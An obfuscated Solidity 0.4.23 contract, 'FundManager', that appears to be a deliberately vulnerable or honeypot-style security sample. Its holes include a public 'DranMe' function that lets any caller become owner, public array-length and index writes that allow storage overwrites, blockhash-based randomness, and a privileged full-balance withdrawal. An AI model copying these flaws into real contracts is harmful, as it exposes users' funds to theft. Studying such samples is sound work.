pragma solidity ^0.4.23;

contract FundManager {


address public _0x4c63a2 = 0x0;
address public _0x59e1dd;
address public _0xf22583 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0x6febfd = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x68eca9;

mapping(address=>bool) _0x7101f9;

uint256 public _0xd8d38e;
uint256[] public _0xd674be = [951828771,158769871220];
uint256[] public balance;


function DranMe() public payable{
	_0x59e1dd = msg.sender;
}


modifier _0x728180() {
    require(msg.sender == _0x59e1dd);
    _;
}

modifier _0x0c4964() {
    require(msg.sender == _0x4c63a2);
    _;
}

modifier _0x365fa8() {
    require(_0x7101f9[msg.sender]);
    _;
}


function _0x2d32c1() public constant returns(uint256) {
	return _0xd674be.length;
}

function _0x255fed(uint256 _0xd73510) public payable _0x728180{
	_0xd8d38e = _0xd73510;
}

function _0x2f213e() public constant returns(uint256) {
	return _0x68eca9.length;
}

function _0xd371bc() public constant returns(uint256) {
	return address(this).balance;
}

function _0x9ae66d() public payable{
	require(msg.value >= 0.02 ether);
	_0x68eca9.push(msg.sender);
	_0x7101f9[msg.sender]=true;
}

function _0x7a57c2() public payable _0x365fa8{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0x59e1dd || _0x0bd3f0()){
	    uint256 _0x917c60 = 0;
        msg.sender.transfer(_0x917c60);
	}
}

function _0x0bd3f0() private returns(bool){
    bytes32 _0xb82371 = _0x6f0b70(blockhash(block.number-1));
    uint256 _0xd8d38e = uint256(_0xb82371);
        if(_0xd8d38e%5==0){
            if (true) { _0x4c63a2 = msg.sender; }
            return true;
        }
        else{
            return false;
        }
    }

function _0x683c35 () public payable _0x365fa8 {
	require (msg.value >= 0.005 ether);
	_0xf22583.call.value(msg.value)();
}

function _0x9bed8e () public payable _0x365fa8 {
	require (msg.value >= 0.005 ether);
	_0x6febfd.call.value(msg.value)();
}

function _0xc25229 (uint256 _0xb787c1, uint256 _0x2b43b3) public payable _0x365fa8 {
	_0xd674be[_0xb787c1] = _0x2b43b3;
}

function _0x38a56c (uint256 _0x0f446b) public payable _0x365fa8 {
	_0xd674be.length = _0x0f446b;
}

function _0xda3521 (uint256 _0x669bed) public payable _0x365fa8 returns(uint256) {
	return (_0x669bed / (_0xd674be[0]*_0xd674be[1]));
	if((_0x669bed / (_0xd674be[0]*_0xd674be[1])) == _0xd8d38e) {
		_0x59e1dd = _0x4c63a2;
	}
}

function _0x3e00de () public payable _0x365fa8 returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0xd8d38e){
        return true;
    }
}

function _0x477a79() public payable _0x728180 {
	_0x59e1dd.call.value(1 wei)();
}

function _0x5be763() public payable _0x0c4964 {
	_0x4c63a2.transfer(address(this).balance);
}


function() public payable{
	}
}